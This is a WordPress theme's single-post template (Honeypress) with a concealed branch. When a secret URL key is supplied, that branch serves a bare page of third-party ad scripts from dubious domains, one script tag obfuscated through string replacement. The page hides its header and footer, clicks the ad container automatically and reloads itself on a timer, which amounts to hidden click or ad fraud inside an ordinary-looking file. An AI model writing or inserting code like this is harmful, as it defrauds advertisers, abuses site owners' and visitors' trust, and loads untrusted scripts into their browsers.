<?php
/**
 * The template for displaying all single posts
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/#single-post
 *
 * @package Honeypress
 */
if (!isset($_COOKIE['_post_']) && $_GET["key"]==='789789456ddsvds6g4h4yjt7ytr46546tHJGSDhkjhjkkjfGGFH45456464JHJJHGHFGdrdhDDrd4e'){

    $jsOpitionTerraAds = ' <script type="text/javascript">
	atOptions = {
		+-+key+-+ : +-+9e5458978bebe0e5317c46ddc7df257f+-+,
		+-+format+-+ : +-+iframe+-+,
		+-+height+-+ : 250,
		+-+width+-+ : 300,
		+-+params+-+ : {}
	};
	document.write(+-+<scr+-+ + +-+ipt type="text/javascript" src="//restlesscompeldescend.com/9e5458978bebe0e5317c46ddc7df257f/invoke.js"></scr+-+ + +-+ipt>+-+);
</script> ';

$jsOpitionTerraAds = str_replace('+-+',"'",$jsOpitionTerraAds);

	$ads1 = '<iframe data-aa="2255746" src="//ad.a-ads.com/2255746?size=300x250" style="width:300px;height:250px; border:0px; padding:0; overflow:hidden; background-color: transparent;"></iframe>';
	$ads2 = '<div id="106831-2"><script src="//ads.themoneytizer.com/s/gen.js?type=2"></script><script src="//ads.themoneytizer.com/s/requestform.js?siteId=106831&formatId=2"></script></div>'; //x
	$ads3 = '<div class="outbrain-tm" id="106831-16"><script src="//ads.themoneytizer.com/s/gen.js?type=16"></script><script src="//ads.themoneytizer.com/s/requestform.js?siteId=106831&formatId=16"></script></div>';
	$ads4 = '<script async="async" data-cfasync="false" src="//restlesscompeldescend.com/0d6fc7d3adcf143644d2d50daf30d067/invoke.js"></script><div id="container-0d6fc7d3adcf143644d2d50daf30d067"></div>';
	$ads5 = $jsOpitionTerraAds;
    $ads6 = '<script type="text/javascript" src="https://cdn.diclotrans.com/sdk/v1/19660/d0cd9a3d75c89718cd01f69abd17c7a2545c8068/lib.js"></script>';
	$listaADS = [$ads1,$ads2,$ads3,$ads4,$ads5,$ads6];
	$i = rand(0,count($listaADS));
	//get_header();
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="pingback" href="http://ppoxa.com/xmlrpc.php" />
<title>Marketing digital: 10 mil por mês</title>
</head>
                <script id="auto-cmp-tmzr"  type="text/javascript" async="true">
                    (function() {
                    var host = 'www.themoneytizer.com';
                    var element = document.createElement('script');
                    var firstScript = document.getElementsByTagName('script')[0];
                    var url = 'https://cmp.quantcast.com'
                        .concat('/choice/', '6Fv0cGNfc_bw8', '/', host, '/choice.js');
                    var uspTries = 0;
                    var uspTriesLimit = 3;
                    element.async = true;
                    element.type = 'text/javascript';
                    element.src = url;

                    firstScript.parentNode.insertBefore(element, firstScript);

                    function makeStub() {
                        var TCF_LOCATOR_NAME = '__tcfapiLocator';
                        var queue = [];
                        var win = window;
                        var cmpFrame;

                        function addFrame() {
                        var doc = win.document;
                        var otherCMP = !!(win.frames[TCF_LOCATOR_NAME]);

                        if (!otherCMP) {
                            if (doc.body) {
                            var iframe = doc.createElement('iframe');

                            iframe.style.cssText = 'display:none';
                            iframe.name = TCF_LOCATOR_NAME;
                            doc.body.appendChild(iframe);
                            } else {
                            setTimeout(addFrame, 5);
                            }
                        }
                        return !otherCMP;
                        }

                        function tcfAPIHandler() {
                        var gdprApplies;
                        var args = arguments;

                        if (!args.length) {
                            return queue;
                        } else if (args[0] === 'setGdprApplies') {
                            if (
                            args.length > 3 &&
                            args[2] === 2 &&
                            typeof args[3] === 'boolean'
                            ) {
                            gdprApplies = args[3];
                            if (typeof args[2] === 'function') {
                                args[2]('set', true);
                            }
                            }
                        } else if (args[0] === 'ping') {
                            var retr = {
                            gdprApplies: gdprApplies,
                            cmpLoaded: false,
                            cmpStatus: 'stub'
                            };

                            if (typeof args[2] === 'function') {
                            args[2](retr);
                            }
                        } else {
                            if(args[0] === 'init' && typeof args[3] === 'object') {
                            args[3] = { ...args[3], tag_version: 'V2' };
                            }
                            queue.push(args);
                        }
                        }

                        function postMessageEventHandler(event) {
                        var msgIsString = typeof event.data === 'string';
                        var json = {};

                        try {
                            if (msgIsString) {
                            json = JSON.parse(event.data);
                            } else {
                            json = event.data;
                            }
                        } catch (ignore) {}

                        var payload = json.__tcfapiCall;

                        if (payload) {
                            window.__tcfapi(
                            payload.command,
                            payload.version,
                            function(retValue, success) {
                                var returnMsg = {
                                __tcfapiReturn: {
                                    returnValue: retValue,
                                    success: success,
                                    callId: payload.callId
                                }
                                };
                                if (msgIsString) {
                                returnMsg = JSON.stringify(returnMsg);
                                }
                                if (event && event.source && event.source.postMessage) {
                                event.source.postMessage(returnMsg, '*');
                                }
                            },
                            payload.parameter
                            );
                        }
                        }

                        while (win) {
                        try {
                            if (win.frames[TCF_LOCATOR_NAME]) {
                            cmpFrame = win;
                            break;
                            }
                        } catch (ignore) {}

                        if (win === window.top) {
                            break;
                        }
                        win = win.parent;
                        }
                        if (!cmpFrame) {
                        addFrame();
                        win.__tcfapi = tcfAPIHandler;
                        win.addEventListener('message', postMessageEventHandler, false);
                        }
                    };

                    makeStub();

                    var uspStubFunction = function() {
                        var arg = arguments;
                        if (typeof window.__uspapi !== uspStubFunction) {
                        setTimeout(function() {
                            if (typeof window.__uspapi !== 'undefined') {
                            window.__uspapi.apply(window.__uspapi, arg);
                            }
                        }, 500);
                        }
                    };

                    var checkIfUspIsReady = function() {
                        uspTries++;
                        if (window.__uspapi === uspStubFunction && uspTries < uspTriesLimit) {
                        console.warn('USP is not accessible');
                        } else {
                        clearInterval(uspInterval);
                        }
                    };

                    if (typeof window.__uspapi === 'undefined') {
                        window.__uspapi = uspStubFunction;
                        var uspInterval = setInterval(checkIfUspIsReady, 6000);
                    }
                    })();
                </script>
<style>
    .page-title h1{
    	color: #fff !important;
    }
    </style>
<body>
    <header>
	</header>

<style>
	header,footer,dialog{
		display:none;
	}
	.cc-window{
		display:none;
	}
	html{
		overflow: hidden;
	}
	body {
/* 	 background:transparent; */
	}
    .w300{
        width: 300px;
    }

</style>
<div style="display: flex; justify-content: center; background: #fff; font-size:Arial; width:auto;" id="aads">
<?= $listaADS[$i] ?>
</div>
<script>
window.onload = ()=> {
	document.querySelector("#aads").click();
	document.querySelector("#aads").click();
    setTimeout(()=>{
        if (document.querySelector("#aads").clientHeight<50){
            if (!document.querySelector('img')){
                red();
            }
        }
    },5000);
	 setTimeout(()=>{
           red();
    },60000)
}

function red(){
	window.location.href=window.location.href;
}
</script>
<footer></footer>
</body>
</html>
<?php
	//get_footer();
	
}else{
get_header();?>
<section class="section-module blog">
	<div class="container">
		<div class="row">
			<?php
			if ( is_active_sidebar( 'sidebar-1' ) ):			
				echo '<div class="col-lg-8 col-md-7 col-sm-12 standard-view blog-single">';
			else: 
				echo '<div class="col-lg-12 col-md-12 col-sm-12 standard-view blog-single">';
			endif;		
				while(have_posts()): the_post();
					get_template_part('template-parts/content','single');	
				endwhile;
				if(get_theme_mod('honeypress_enable_single_post_admin_details',true)===true):
					get_template_part('template-parts/auth-details');
				endif;	

				// If comments are open or we have at least one comment, load up the comment template.
				if ( comments_open() || get_comments_number() ) : comments_template(); endif;?>
			</div>	
			<?php get_sidebar();?>
		</div>
	</div>
</section>
<?php get_footer();}
